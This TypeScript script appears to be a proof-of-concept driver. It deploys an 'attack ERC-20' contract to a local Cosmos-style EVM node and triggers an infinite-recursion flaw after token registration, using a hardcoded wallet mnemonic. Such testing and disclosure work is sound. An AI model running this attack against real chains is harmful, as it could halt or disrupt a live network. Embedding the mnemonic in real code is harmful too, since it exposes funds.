import { HDNodeWallet, JsonRpcProvider } from "ethers";
import { InfiniteRecursionERC20__factory } from "../../typechain-types";

// connects to local node
const jsonRpcProvider = new JsonRpcProvider("http://localhost:8545");

// mnemonic for the HD wallet
const mnemonic = "guard cream sadness conduct invite crumble clock pudding hole grit liar hotel maid produce squeeze return argue turtle know drive eight casino maze host"
const owner = HDNodeWallet.fromPhrase(mnemonic, "", "m/44'/118'/0'/0/0").connect(jsonRpcProvider)

async function main() {
  const factory = new InfiniteRecursionERC20__factory(owner);
  const contract = await factory.deploy("test", "TST", { maxFeePerGas: 1e12 });
  const contractAddr = await contract.getAddress();
  console.log("Contract address: ", contractAddr)

  console.log("Deploying the attack ERC-20")
  await contract.waitForDeployment();

  console.log("Sleeping 2 seconds for the registration to be executed")
  await delay(2_000);

  console.log("Triggering the infinite recursion")
  await contract.go({ gasLimit: 1_000_000 });
}

main();

// Helper function to create a delay
function delay(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}